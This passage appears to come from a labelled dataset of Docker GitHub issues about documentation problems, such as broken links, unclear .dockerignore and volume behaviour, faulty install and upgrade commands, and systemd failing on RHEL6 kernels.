\nmallocs complete\nUsed 0 bytes\nUsed 104857600 bytes\nUsed 209715200 bytes\nUsed 314572800 bytes\nUsed 419430400 bytes\nUsed 524288000 bytes\nUsed 629145600 bytes\nUsed 734003200 bytes\nUsed 838860800 bytes\nUsed 943718400 bytes\nUsed 1048576000 bytes\nUsed 1153433600 bytes\nUsed 1258291200 bytes\nUsed 1363148800 bytes\nUsed 1468006400 bytes\nUsed 1572864000 bytes\nUsed 1677721600 bytes\nUsed 1782579200 bytes\nUsed 1887436800 bytes\nUsed 1992294400 bytes\nUsed 2097152000 bytes\nUsed 2202009600 bytes\nUsed 2306867200 bytes\nKilled\n#\n```\n\nHere we see the container was killed due to OOM.\n\n&nbsp;\n\nNow we set a limit of 500M\n\n```\n# docker run -ti --oom-kill-disable -m 500M do-oom \nmallocs complete\nUsed 0 bytes\nUsed 104857600 bytes\nUsed 209715200 bytes\nUsed 314572800 bytes\nUsed 419430400 bytes\nKilled\n#\n```\n\n&nbsp;\n\nNow lets run it with the fix enabled, but no memory limit:\n\n```\n# docker run -ti --oom-kill-disable --privileged do-oom fix do-oom\nmallocs complete\nUsed 0 bytes\nUsed 104857600 bytes\nUsed 209715200 bytes\nUsed 314572800 bytes\nUsed 419430400 bytes\nUsed 524288000 bytes\nUsed 629145600 bytes\nUsed 734003200 bytes\nUsed 838860800 bytes\nUsed 943718400 bytes\nUsed 1048576000 bytes\nUsed 1153433600 bytes\nUsed 1258291200 bytes\nUsed 1363148800 bytes\nUsed 1468006400 bytes\nUsed 1572864000 bytes\nUsed 1677721600 bytes\nUsed 1782579200 bytes\nUsed 1887436800 bytes\nUsed 1992294400 bytes\nUsed 2097152000 bytes\nUsed 2202009600 bytes\nUsed 2306867200 bytes\nUsed 2411724800 bytes\n#\n```\n\nStill was killed\n\n&nbsp;\n\nNow we run it with a memory limit, and the fix enabled:\n\n```\n# docker run -ti --oom-kill-disable -m 500M --privileged do-oom fix do-oom \nmallocs complete\nUsed 0 bytes\nUsed 104857600 bytes\nUsed 209715200 bytes\nUsed 314572800 bytes\nUsed 419430400 bytes\n```\n\nHere the process just hangs as it's gone defunct. CTRL+C doesn't work, and we have to detach & kill the container.\n\n---\n\n```\n# docker version\nClient version: 1.7.0\nClient API version: 1.19\nGo version (client): go1.4.2\nGit commit (client): 0baf609\nOS/Arch (client): linux/amd64\nServer version: 1.7.0\nServer API version: 1.19\nGo version (server): go1.4.2\nGit commit (server): 0baf609\nOS/Arch (server): linux/amd64\n\n# docker info\nContainers: 107\nImages: 376\nStorage Driver: btrfs\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 3.18.1-gentoo\nOperating System: Gentoo/Linux\nCPUs: 4\nTotal Memory: 7.512 GiB\nName: gadget\nID: KLI3:BPWQ:CK45:NJCL:ULCH:BV6Z:XDFM:YKTZ:EZ7D:UBE7:ZQCK:HOGN\nUsername: phemmer\nRegistry: https://index.docker.io/v1/\n\n# uname -a\nLinux gadget 3.18.1-gentoo #1 SMP Sun Dec 21 12:15:16 EST 2014 x86_64 Intel(R) Core(TM) i7-3517U CPU @ 1.90GHz GenuineIntel GNU/Linux\n```\n"},{"labels":["documentation"],"text":"In the [Dockerfile best practices](https://docs.docker.com/articles/dockerfile_best-practices/) documentation, we read:\n\n> In the case of the ADD and COPY instructions, the contents of the file(s) being put into the image are examined. Specifically, a checksum is done of the file(s) and then that checksum is used during the cache lookup. If anything has changed in the file(s), including its metadata, then the cache is invalidated.\n\nThe first sentence is incomplete and misleading, _files_, _files contents_, and _files contents and metadata_ are used interchangeably, but there is actually only the latter. The purpose of mentioning the checksum is unclear, and mentioning it breaks the logical connection between the first and and the third sentence. A better wording would be:\n\n> In the case of the ADD and COPY instructions, the files being put into the image are examined and if anything has changed in their contents or their metadata, then the cache is invalidated. The comparison mechanism actually uses a checksum deduced from the files contents and metadata. Therefore, in some extremely rare occurrences, some cache entry might not be invalidated as expected.\n\n---\n\n```\ndocker version:     Not relevant,\ndocker info:          this is about \nuname -a:                   the website\n```\n"},{"labels":["documentation",null],"text":"YOu have a dangling link in line 80 of docs/reference/commandline/run.md:\n\n```\nThe `docker run` command can be used in combination with `docker commit` to\n[*change the command that a container runs*](#commit-an-existing-container).\n```\n\nThis should probably point to docs/reference/commandline/commit.md,\nbut I'm not sure exactly how that link should look (there didn't seem\nto be any examples in the existing run.md document).\n\nIdentified here: https://github.com/docker/docker/pull/13987\n"},{"labels":["documentation",null],"text":"docs/userguide/dockervolumes.md\n\nSee https://github.com/docker/docker/pull/14235 for discussion\n"},{"labels":["documentation",null,null],"text":"We have a document for reference/run which looks like it might be better suited as  a \"how to use run\" and the commandline/run.md file which is actually a reference.\n\nNeed to take a closer look and see what the intention was in the original design and solve it.\n\n![image](https://cloud.githubusercontent.com/assets/1347209/8503836/a61aa1de-217a-11e5-92bc-2c79777e6505.png)\n"},{"labels":["documentation"],"text":"I am confused about how dockerignore works.  I think it needs a more formal specification, and/or the examples should get into tricky cases more.  Here is a slightly pedantic list of some unclear things in the online documentation:\n\n\"Filepaths in .dockerignore are absolute with the current directory as the root.\"  Yet in the example .dockerignore file you give, either all or some of the patterns only match relative paths (depending on whether a leading asterisk can match the empty string).  I think what is meant is that filepaths are interpreted relative to the current directory but as if a chroot command had made that directory the root?\n\n\"the search is not recursive\".  What does this mean?\n\n\"Globbing (file name expansion) is done using Go’s filepath.Match rules.\"  In the linked documentation, we read that asterisk \"matches any sequence of non-Separator characters\" (which means characters other than '/'?) and that \"Match requires pattern to match all of name, not just a substring\".  Yet in the example file, you say that the pattern \"*.md\" will exclude all markdown files.  All four of these claims can't be true.\n\n\"Formats like [^temp*] are ignored.\"  I don't understand what this means. Is it a qualification of the claim that globbing is done using Go's filepath.Match rules?\n"},{"labels":["documentation"],"text":"People are using `https://get.docker.com/ubuntu/` to install docker and end up with problems because it does not install aufs (Example : https://github.com/docker/docker/issues/14204). https://get.docker.com/ubuntu/ should just redirect to `https://get.docker.com/`, so that people install docker on ubuntu correctly.\n\nCC : @moxiegirl @thaJeztah @jfrazelle \n"},{"labels":["documentation"],"text":"Is there a documentation/specification available about the stream format returned by accessing the `GET /containers/(id)/logs` endpoint of the REST API?\n\nIt looks like each line is prefixed with `8 bytes` of binary data, which might encode line length, a time code, line codes, char offsets, or ... but I haven't found any documentation about that format (at least not in the [docker remote api v1.19 docs](https://docs.docker.com/reference/api/docker_remote_api_v1.19/)).\n\nI am running:\n\n```\nDocker version 1.7.0, build 0baf609\n```\n\nE.g.: running this request:\n\n```\ncurl \"http://localhost:2375/containers/8c579/logs?follow=true&stderr=true&stdout=true&timestamps=true\"\n```\n\ngives this result (note the garbage characters in front of the time stamps):\n\n``````\n☺      ½2015-06-25T18:10:22.916242788Z 1:C 25 Jun 18:10:22.914 # Warning: no config file specified, using the default config. In order to specify a config file use redis-server /path/to/redis.conf\n☺      e2015-06-25T18:10:22.921992353Z                 _._\n☺      e2015-06-25T18:10:22.922012790Z            _.-``__ ''-._\n☺      g2015-06-25T18:10:22.922020284Z       _.-``    `.  `_.  ''-._           Redis 3.0.2 (00000000/0) 64 bit\n☺      e2015-06-25T18:10:22.922026895Z   .-`` .-```.  ```\\/    _.,_ ''-._\n☺      b2015-06-25T18:10:22.922033469Z  (    '      ,       .-`  | `,    )     Running in standalone mode\n☺      R2015-06-25T18:10:22.922039644Z  |`-._`-...-` __...-.``-._|'` _.-'|     Port: 6379\n☺      N2015-06-25T18:10:22.922045827Z  |    `-._   `._    /     _.-'    |     PID: 1\n☺      e2015-06-25T18:10:22.922052038Z   `-._    `-._  `-./  _.-'    _.-'\n☺      e2015-06-25T18:10:22.922057983Z  |`-._`-._    `-.__.-'    _.-'_.-'|\n☺      e2015-06-25T18:10:22.922064221Z  |    `-._`-._        _.-'_.-'    |           http://redis.io\n☺      e2015-06-25T18:10:22.922070404Z   `-._    `-._`-.__.-'_.-'    _.-'\n☺      e2015-06-25T18:10:22.922078420Z  |`-._`-._    `-.__.-'    _.-'_.-'|\n☺      e2015-06-25T18:10:22.922084460Z  |    `-._`-._        _.-'_.-'    |\n☺      e2015-06-25T18:10:22.922090389Z   `-._    `-._`-.__.-'_.-'    _.-'\n☺      e2015-06-25T18:10:22.922096333Z       `-._    `-.__.-'    _.-'\n☺      e2015-06-25T18:10:22.922102155Z           `-._        _.-'\n☺      e2015-06-25T18:10:22.922108076Z               `-.__.-'\n☺       2015-06-25T18:10:22.922113903Z\n☺      ]2015-06-25T18:10:22.923169420Z 1:M 25 Jun 18:10:22.923 # Server started, Redis version 3.0.2\n``````\n"},{"labels":["documentation"],"text":"https://docs.docker.com/reference/run/\n\nThe table format is messy after the paragraph shown as below.\n\n> In addition to --privileged, the operator can have fine grain control over the capabilities using --cap-add and --cap-drop. By default, Docker has a default list of capabilities that are kept. The following table lists the Linux capability options which can be added or dropped.\n\nI have checked other tables in `run` reference - **markdown** issue - has been converted to **html** format. \n"},{"labels":["documentation"],"text":"`Docker version 1.6.2, build 7c8fca2`\n\nFrom documentation:\nhttps://docs.docker.com/reference/builder/#volume\n\n> The `docker run` command initializes the newly created volume with any data that exists at the specified location within the base image.\n\n(1) This works as excepted:\n\n```\nRUN mkdir -p /foo/bar && touch /foo/bar/test.txt\nVOLUME /foo/bar\n```\n\n(2) but this not:\n\n```\nVOLUME /foo/bar\nRUN touch /foo/bar/test.txt\n```\n\nFile in image is created successfully, but when container is created `/foo/bar` becomes empty.\nStrangely, (2) seems to work when `VOLUME` part is taken from cache, and `RUN` part is freshly appended to Dockerfile. But full rebuild of image breaks this.\n\n---\n\nBUG REPORT INFORMATION\n\nUse the commands below to provide key information from your environment:\n\ndocker version:\n\n```\ndocker@boot2docker:~$ docker version\nClient version: 1.6.2\nClient API version: 1.18\nGo version (client): go1.4.2\nGit commit (client): 7c8fca2\nOS/Arch (client): linux/amd64\nServer version: 1.6.2\nServer API version: 1.18\nGo version (server): go1.4.2\nGit commit (server): 7c8fca2\nOS/Arch (server): linux/amd64\n```\n\ndocker info:\n\n```\ndocker@boot2docker:~$ docker info\nContainers: 13\nImages: 195\nStorage Driver: aufs\n Root Dir: /mnt/sda1/var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 221\n Dirperm1 Supported: true\nExecution Driver: native-0.2\nKernel Version: 4.0.3-boot2docker\nOperating System: Boot2Docker 1.6.2 (TCL 5.4); master : 4534e65 - Wed May 13 21:24:28 UTC 2015\nCPUs: 2\nTotal Memory: 1.957 GiB\nName: boot2docker\nID: EDZ6:D6NA:EKMP:HL4L:LUQ3:MGLZ:CAEW:EXEZ:HPJU:Q7RT:3CL3:TBNI\nDebug mode (server): true\nDebug mode (client): false\nFds: 54\nGoroutines: 88\nSystem Time: Sat May 30 08:05:47 UTC 2015\nEventsListeners: 1\nInit SHA1: 7f9c6798b022e64f04d2aff8c75cbf38a2779493\nInit Path: /usr/local/bin/docker\nDocker Root Dir: /mnt/sda1/var/lib/docker\n```\n\nuname -a:\n\n```\ndocker@boot2docker:~$ uname -a\nLinux boot2docker 4.0.3-boot2docker #1 SMP Wed May 13 20:54:49 UTC 2015 x86_64 GNU/Linux\n```\n\nProvide additional environment details (AWS, VirtualBox, physical, etc.):\n- VirtualBox, boot2docker\n\nList the steps to reproduce the issue:\nDescribe the results you received:\nDescribe the results you expected:\nSee above.\n\n----------END REPORT ---------\n# ENEEDMOREINFO\n"},{"labels":["documentation"],"text":"Here is what you get when you search in the docker repo for the string `\"VolumesFrom\"`: https://github.com/docker/docker/search?utf8=%E2%9C%93&q=VolumesFrom\n\nThe issue is that most of the response formats ascribed to docker inspect say that the endpoint will return something like\n\n`\"VolumesFrom\":\"\"`\n\nThis is untrue - as of docker 1.7 (and probably much earlier), docker returns either `null` or something like `[\"contrainerid\"]` as the value for that key.\n\nThe tricky part is that early docker (1.0) used to accept a string as input for `VolumesFrom` in the remote api, before a change (maybe around 1.4?) had it take an array instead. I'm not sure when both the input and output changed, but someone more knowledgeable should probably retroactively correct the documentation thereof.\n\nI stumbled across this issue because docker 1.7's remote API started **throwing errors** when passed string values for `VolumesFrom` - it used to silently accept the empty string as a valid input. I don't count this as a bug, but it was certainly surprising.\n\n_As an aside there has GOT to be a better way to arrange all of these docs besides a series of increasingly large and self-contradictory markdown files._\n"},{"labels":["documentation",null,null,null],"text":"Using this issue to solicit feedback on the exciting new networking experimental features introduced during the Docker 1.7 / 1.8 release time-frame.\nhttps://github.com/docker/docker/blob/master/experimental/networking.md\n"},{"labels":["documentation"],"text":"I'm a newbie and trying to contribute. Where I could find the docs file for getting started for linux https://docs.docker.com/linux/started/\nand the getting started link in https://docs.docker.com/linux/started/ is broken\n"},{"labels":["documentation"],"text":"docs/reference/run.md in section \"Overriding Dockerfile image defaults\" implies that the docker run --expose option overrides the EXPOSE command in a Dockerfile. It does not. docker run --expose simply adds to the list of exposed ports. It does not override the Dockerfile EXPOSE list of ports.\n\nIf you think this is trivial, this actually cost me a cycle, because I _assumed_ from the doc that I could put an EXPOSE command in the Dockerfile, and override it later. \n\nThere should be a --unexpose option but that's a different issue. This issue is just about correcting the doc.\n"},{"labels":["documentation"],"text":"According to the [documentation](https://docs.docker.com/userguide/dockervolumes/#data-volumes), new volumes should be initialized with the contents of the base image in the volume location.\n\nThis indeed works when running `docker -v /path/inside/container ...`, but not when running `docker -v /path/on/host:/path/inside/container ...`.\n\nThe documentation doesn't mention there should be a different behavior, so we should either:\n1. Update the documentation to mention that the behavior is different when the volume is bound to a host directory\n2. Find a way to initialize the volume when binding it to a host directory. Perhaps if the host directory does not initially exist, or with an extra `docker` flag?\n"},{"labels":["documentation",null],"text":"Setting pid=host or ipc=host sets the \"disabled\" selinux policy. This should be documented (or fixed), as it is neither obvious nor apparent. A warning message on usage may also be appropriate.\n\nVerified in 1.7.0-rc2\n"},{"labels":["documentation"],"text":"For the Fedora 21 and later installation instructions, I was thinking that updating the instructions to reflect the dnf update in Fedora 22 would be useful and helpful to users. \n"},{"labels":["documentation",null],"text":"According to the now (official) dockerbench rule [#2.7](https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.6_Benchmark_v1.0.0.pdf) \"`2.7 Do not use the aufs storage driver`\" Its seems recommended to just use the devicemapper. Shouldn't the [magic install url](https://get.docker.io/) reflect this and _not_ install the -extra linux image packages in order to allow for AUFS?\n\nI'd say just dropping the aufs packages and requirements for (at least) Ubuntu 14.04+ would suffice?\n\nThanks!\n"},{"labels":["documentation",null],"text":"Was running through the tutorial and accidentally did:\n`docker run learn/ping www.google.com`\n\ninstead of\n`docker run learn/ping ping www.google.com` (as the answer states)\n\nMy mistake validated as a incorrect answer in the emulator with a popup claiming it was correct.\n\n![dockerissue](https://cloud.githubusercontent.com/assets/1414307/7973411/ff3fcb82-0a22-11e5-90ce-eeb4faefaa8a.png)\n"},{"labels":["documentation"],"text":"He reports a TLS error and suggests the work around is to start the daemon directly.  Using 14.04.2 \n\nhttps://plus.google.com/116544552139899093398/posts/NFE4ubBAabo\n"},{"labels":["documentation"],"text":"The MAINTAINERS file says all decisions can be expressed as a pull request (https://github.com/docker/docker/blob/master/MAINTAINERS#L76). But I was unable to find any documentation explaining the release cadence (when is a minor as in semver's MAJOR.MINOR.PATCH). The closes thing I could find was https://github.com/docker/docker/blob/master/project/RELEASE-CHECKLIST.md which discusses what to do once you know you are working on making a release\n"},{"labels":["documentation",null],"text":"As of https://github.com/docker/docker/commit/1df87b95066198c30312147393c18e0be0564fd0 the `create container` remote api endpoint still accepts a `HostConfig` as POST body, but a [code comment indicates](https://github.com/docker/docker/blob/master/daemon/start.go#L27) that the HostConfig should only be used for `start container`.\n\nThe relevant docs produced some confusion (see #13466) after the request body description had been removed and [added](https://github.com/docker/docker/commit/ac12c8053779d36409e248f41c4d80ef0e4fbe9f) again.\n\nI propose to explictly indicate in the docs that the HostConfig is only allowed on `start container` for backwards compatibility.\n"},{"labels":["documentation"],"text":"![image](https://cloud.githubusercontent.com/assets/1347209/7888740/8df9e62e-05ef-11e5-8d55-c67425ba7039.png)\n"},{"labels":["documentation"],"text":"@moxiegirl can we add @justone tool to documentation somewhere and reference to docker images.\n@justone Thank you! This is so cool!\n\nSee https://github.com/docker/docker/pull/12333\n"},{"labels":["documentation"],"text":"A little email just to tell you that the documentation about installing Docker on Debian Jessie (https://docs.docker.com/installation/debian/) is not up-to-date as it seems that the docker.io does not exist anymore in backports.\n\nThe installation through wget -qO- https://get.docker.com/ | sh works though. I would just add a mention about systemctl enable docker to have Docker starts at each machine start.\n\nKind regards,\nPhilippe\n"},{"labels":["documentation",null,null],"text":"doc: docker images should explain repository column and when none. Or provide a link to where these are explained.\n\nhttps://docs.docker.com/reference/commandline/cli/#images\n\n`docker images` starts \"The default docker images will show all top level images, their repository and tags, and their virtual size.\"  It goes on to do a good job of explaining the last item \"virtual size\".\n"},{"labels":["documentation",null],"text":"---- TRIAGE -----\n\n**Problem:** Systemd is not supported on RHEL6 kernels (and this won't be fixed). As such containers which include systemd will not work.\n\n**Resolution:** Update docs to reflect issues attempting to run systemd based images on kernels < 3.8\n\n---- END TRIAGE ----\n\nHi,\n\nthis is more a documentation / information related problem:\n\n\"Develop, Ship and Run Any Application, Anywhere\" NOT true for:\n- Anywhere = [Redhat | CentOS] 6) AND\n- Application dependent on systemd\n\nThis should be at least mentioned in the [install description](https://docs.docker.com/installation/rhel/) for RH6.\n\n_In our case we realized this only when we wanted to deploy ready, working containerized Apps to production at a customer. Their operations and security departments disallows major Kernel or OS upgrades so we have a real problem - which bit us unexpectedly, due to the claim that the docker enabled series 2 RH kernel is fine._\n# Description of problem:\n\nAny systemd enabled container can't start on RH 6, with systemd as Pid 1\n- With --privileged or without\n- With -e 'container:docker' or without\n\nThe root cause is the missing /sys/fs/cgroup interface of the kernel - which can't be created there (sysfs) - allthough all cgroups are actually supported, mounted to /cgroup\n\nI'm clear that docker supports the one container per process approach but for various reasons (many legacy) we require a full init system - and systemd is the default in Linux these days.\n## `docker version`:\n\nTried 1.3.0 and also Docker version 1.6.2, build 7c8fca2\n## `docker info`:\n\n[root@ip-172-30-0-24 ~]# docker info\nContainers: 19\nImages: 11\nStorage Driver: devicemapper\n Pool Name: docker-202:80-3145731-pool\n Pool Blocksize: 65.54 kB\n Backing Filesystem: extfs\n Data file:\n Metadata file:\n Data Space Used: 2.375 GB\n Data Space Total: 107.4 GB\n Data Space Available: 105 GB\n Metadata Space Used: 2.879 MB\n Metadata Space Total: 2.147 GB\n Metadata Space Available: 2.145 GB\n Udev Sync Supported: false\n Library Version: 1.02.82-git (2013-10-04)\nExecution Driver: native-0.2\nKernel Version: 2.6.32-504.el6.x86_64\nOperating System: <unknown> (containerized)\nCPUs: 1\nTotal Memory: 994.7 MiB\nName: ip-172-30-0-24.eu-west-1.compute.internal\nID: IZBN:IMN5:OGHI:L2LQ:IVB7:RBPC:7KPS:KKSW:ZKZF:SHMD:EPNF:ABXB\n## `uname -a`:\n\nLinux ip-172-30-0-24.eu-west-1.compute.internal 2.6.32-504.el6.x86_64 #1 SMP Tue Sep 16 01:56:35 EDT 2014 x86_64 x86_64 x86_64 GNU/Linux\n## Environment details (AWS, VirtualBox, physical, etc.):\n\n[root@ip-172-30-0-24 ~]# cat /etc/redhat-release\nRed Hat Enterprise Linux Server release 6.6 (Santiago)\nReproduced on AWS (ami-9cfd53eb)\n\nOn customer site its in vmware server.\n## How reproducible:\n\n100% \n## Steps to Reproduce:\n\nWe tried various ways. Here the most naive ones:\n\na) # docker run -ti --privileged -e \"container=docker\" debian:jessie  /sbin/init\n-> Failed to mount tmpfs at /sys/fs/cgroup: No such file or directory\n\nb) # docker run -ti --privileged -e \"container=docker\" -v '/cgroup:/sys/fs/cgroup' debian:jessie  /sbin/init\n-> FATA[0000] Error response from daemon: Cannot start container 3c37ba2028310fcfbe7fa3e8f8f084ecb28670d7b1566e4865d3c9ff0eeca590: [8] System error: mkdir /var/lib/docker/devicemapper/mnt/3c37ba2028310fcfbe7fa3e8f8f084ecb28670d7b1566e4865d3c9ff0eeca590/rootfs/sys/fs/cgroup: no such file or directory\n\nc) # ./docker-1.3.0 run -t -i --privileged --lxc-conf=\"lxc.mount.auto = proc:rw sys:rw cgroup-full:mixed\" -e 'container=docker' debian:jessie  /sbin/init\n-> Failed to mount tmpfs at /sys/fs/cgroup: No such file or directory\n\nd) # ./docker-1.3.0 run -it --privileged cloudbees/archbase\n-> Failed to mount tmpfs at /sys/fs/cgroup: No such file or directory\n\ne) # ./docker-1.3.0 run -it cloudbees/archbase\n-> Failed to mount tmpfs at /run: Operation not permitted\n## Expected Results:\n\nsystemd as pid1 inside (as working with ubuntu as base OS or also when we upgrade the kernel according to http://nareshv.blogspot.com/2014/02/installing-docker-08-version-on-centos.html  (which is not allowed in production))\n## Additional info:\n- https://github.com/jpetazzo/dind/issues/17\n- http://developerblog.redhat.com/2014/05/05/running-systemd-within-docker-container/ (which is only working on RH7)\n- https://registry.hub.docker.com/u/offlinehacker/nixos/ (does also not work)\n\nIn general I want to say that the problem is **not a bug in docker as such**. Since it is also not possible to get systemd up on RH6 using lxc.\n\nBut it should be made very clear to users of dockers that their containers can't work on default RH 6 - if systemd is used as init system inside.\n\nPS: If there is any workaround whatsoever (dind?) I would be very happy if I'm proven wrong with the main claim of this issue.\n"},{"labels":["documentation"],"text":"I've checked docker --version before and after running the command and I still have version `Docker version 1.5.0, build a8a31ef`\n\n```\nwget -N https://get.docker.com/ | sh\n--2015-05-15 11:09:03--  https://get.docker.com/\nResolving get.docker.com (get.docker.com)... 162.242.195.82\nConnecting to get.docker.com (get.docker.com)|162.242.195.82|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 7452 (7.3K) [text/plain]\nSaving to: ‘index.html’\n\n100%[===============================================================================================================================================================================>] 7,452       --.-K/s   in 0s\n\n2015-05-15 11:09:04 (1.46 GB/s) - ‘index.html’ saved [7452/7452]\n```\n\n```\n#uname -a\nLinux UBUNTU4117V 3.13.0-49-generic #83-Ubuntu SMP Fri Apr 10 20:11:33 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\n```\n\n```\n# docker info\nContainers: 0\nImages: 129\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 129\nExecution Driver: native-0.2\nKernel Version: 3.13.0-49-generic\nOperating System: Ubuntu 14.04.2 LTS\nCPUs: 2\nTotal Memory: 15.67 GiB\nName: UBUNTU4117V\nID: QTIT:JXGL:A6XO:7YXZ:5LKY:PCKL:EG7T:FD4A:CZID:UE72:A77K:3WAY\nWARNING: No swap limit support\n```\n"},{"labels":["documentation"],"text":"The docker-pull man page usage line is missing an entry for alternate registries.  Right now it looks like:\n\ndocker pull [-a|--all-tags[=false]] [--help] NAME[:TAG]\n\nbut should probably look like:\n\ndocker pull [-a|--all-tags[=false]] [--help] [REGISTRY_HOST[:REGISTRY_PORT]/]NAME[:TAG]\n\nThe docker-push man page has a more correct usage line which includes alternate registries, but it's a little misleading because it looks like:\n... NAME[:TAG] | [REGISTRY_HOST[:REGISTRY_PORT]/]NAME[:TAG]\n"},{"labels":["documentation",null,null],"text":"Windows installation step 2 has a typo change \"or Windows\" to \"for Windows\"\n"},{"labels":["documentation"],"text":"I'm not sure where the problem lies, but the upgrade documentation for Ubuntu is messed up.\n\nHere's what the docs say at (http://docs.docker.com/installation/ubuntulinux/#upgrade-docker):\n\n```\nUpgrade Docker\nTo install the latest version of Docker, use the standard -N flag with wget:\n\n$ wget -N https://get.docker.com/ | sh\n```\n\nExecuting this command when you have Docker installed does nothing - it simply downloads the contents of https://get.docker.com/index.html and saves it in the current directory as `index.html`.\n\nIf you execute the downloaded script, you get a warning message:\n\n```\nWarning: \"docker\" or \"lxc-docker\" command appears to already exist.\nPlease ensure that you do not already have docker installed.\nYou may press Ctrl+C now to abort this process and rectify this situation.\n```\n\nBeing the cautious sort, I cancelled, then attempted to uninstall (via `apt-get purge`) docker before proceeding. This worked.\n\nBut I don't know if I needed to do that. The warning above seems to indicate that I did need to, but I wouldn't know that from the documentation.\n\nFirst,\n\nThe command given in the documentation needs to be changed,\n\nthen either:\n1. the documentation needs to advise users to uninstall docker before attempting to upgrade, or\n2. the warning message in the install script needs to be amended (or dropped) if it's not accurate\n\nThanks\n"},{"labels":["documentation",null],"text":"Hi,\n\nI've look a bit at the label documentation, the `labels-custom-metadata.md` file (and it [online version](https://docs.docker.com/userguide/labels-custom-metadata/)) and it seems something has not been updated — or at least it is not working.\n\nAssuming 4fa6e0f0c678 is a container, the command specified in the document won't work as expected.\n\n``` bash\n$ docker inspect -f \"{{json .Labels }}\" 4fa6e0f0c678\nnull\n$ docker inspect -f \"{{json .Config.Labels }}\" 4fa6e0f0c678\n{\"Vendor\":\"ACME Incorporated\",\"com.example.is-beta\":\"\",\"com.example.version\":\"0.0.1-beta\",\"com.example.release-date\":\"2015-02-12\"}\n```\n\nAnd it's not the same format to use for inspect on images, the format would  be `{{json .ContainerConfig.Labels }}`.\n\nCorrect me if I'm wrong, but for now, I'll send a PR to fix that :)\n"},{"labels":["documentation"],"text":"Hi,\n\nafter the release of Debian jessie the package docker.io doesn't exists in the main or backports repository of jessie anymore.\nThe docs should provide a valid and official way to install docker on jessie.\n\nMy currently workaround is to use the docker repository which is provided for ubuntu.\n\n``` bash\napt-get install apt-transport-https\napt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 36A1D7869245C8950F966E92D8576A8BA88D21E9\necho \"deb https://get.docker.com/ubuntu docker main\" >> /etc/apt/sources.list\napt-get update\napt-get install lxc-docker\n```\n"},{"labels":["documentation",null],"text":"http://docs.docker.com/project/get-help/ recommends using webchat and has a little procedure to get people started.  IRCloud has a free account and better usability. We should switch it out.\n"},{"labels":["documentation"],"text":"The `--cgroup-parent` option was proposed in https://github.com/docker/docker/issues/8551, and implemented in https://github.com/docker/docker/pull/11428 and (for `docker build`) in https://github.com/docker/docker/pull/11844\n\nThe documentation for this feature is currently very limited, and even _missing_ in some places (for example, in the `docker run` [command line reference](https://github.com/docker/docker/blob/8bd5a95e1e39541dfc5dc635c5c8e7604fe10028/docs/sources/reference/commandline/cli.md#run)). In addition, there's no example on how to use this feature, which might help users understand on how to use this.\n\nObviously, care should be taken to not to explain cgroups in itself, but I found a nice short walk-through here; http://linuxaria.com/article/introduction-to-cgroups-the-linux-conrol-group)\n"},{"labels":["documentation"],"text":"I was going to install the latest docker via \n\n`wget -qO- https://get.docker.com/ | sh`\n\nHowever, uninstalling after doing so is not documented.\n1. It should be. \n2. I should be able to find it in the docs by searching for 'uninstall'.\n3. The documentation ought to say that the solution is \"run the command `sudo docker uninstall`\" or something along those lines.\n"},{"labels":["documentation",null],"text":"The main docker manpage, `man docker`, makes it look like you can do things like `docker-ps` instead of `docker ps`, which is unintentionally misleading.\n\nGiven these parts of the manpage:\n\n> **COMMANDS**\n> &nbsp;&nbsp;&nbsp;&nbsp;**docker-attach(1)**\n> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Attach to a running container\n\nThis formatting _suggests_ that I might want to run `docker-attach` as opposed to `docker attach`. This doesn't work of course, but it might be more clear to specifically refer to `attach` as the command, and point out that full documentation for attach is found in the `docker-attach(1)` manpage.\n\n> **COMMANDS**\n> &nbsp;&nbsp;&nbsp;&nbsp;**attach**\n> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Attach to a running container.\n> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;See **docker-attach(1)** for full documentation on the **attach** command.\n"},{"labels":["documentation",null],"text":"The `nproc` setting for `--ulimit` seems to be a special case in that it is limited per user (and per process). As such if you start up multiple containers using the same uid, they are limited by the same `nproc` value, for example:\n\n```\ndocker run -d -u daemon --ulimit nproc=3 busybox top\ndocker run -d -u daemon --ulimit nproc=3 busybox top\ndocker run -d -u daemon --ulimit nproc=3 busybox top\ndocker run -d -u daemon --ulimit nproc=3 busybox top\n```\n\nThe last `docker run` will fail since each container is using the same uid, and nproc for that user has been limited to 3... this is, unfortunately, how the system handles `nproc`\n\nSome extra docs explaining this would be extremely helpful.\n"},{"labels":["documentation"],"text":"https://github.com/docker/docker/blob/master/docs/sources/articles/security.md\n\nShould mention --read-only on container here.\n"},{"labels":["documentation",null],"text":"hey there, I'm totally new to Docker but I've heard so much about it that I figured I'd give it a shot.\n\nI checked this out on the website: https://www.docker.com/tryit/\n\nI must say, I have a lot of questions after going through this tutorial. Before I move on and find answers to all my questions, I thought I'd leave them here to improve the tutorial.\n\n---\n\nThere seems to be some concept of an image and a container which are different things, but I have no idea what the difference is so I'm just going to call everything a container.\n\nWe download `learn/tutorial`. We run an echo command through it. Then we install ping though it. My understanding is that ping was installed in the `learn/tutorial` container. But then what's the difference between `docker ps` and `docker ps -l`? We then commit this \"change\" to learn/ping -- I'm assuming this is analogous to creating a new branch from learn/tutorial. I could have just as easily committed back to learn/tutorial?\n\n---\n\nAnyways, I hope those questions make sense. I think it would help to give some git analogies in there. No need to answer all the questions -- I can figure  it out. I just figured getting these questions out could improve the \"try it\" experience.\n"},{"labels":["documentation",null],"text":"http://docs.docker.com/reference/commandline/cli/#default-ulimits\n\ninheritted > inherited\n"},{"labels":["documentation"],"text":"http://docs.docker.com/userguide/dockerimages\n"},{"labels":["documentation",null],"text":"The [Debian install documentation for jessie](https://docs.docker.com/installation/debian/#debian-jessie-80-64-bit) states that there is a Debian package for jessie, while [it has been removed since March 31st](https://tracker.debian.org/pkg/docker.io). Please update the docs.\n"},{"labels":["documentation",null],"text":"The last `git push` at the bottom of https://docs.docker.com/project/work-issue/#pull-and-rebase-frequently will fail, I think, unless it has `-f` 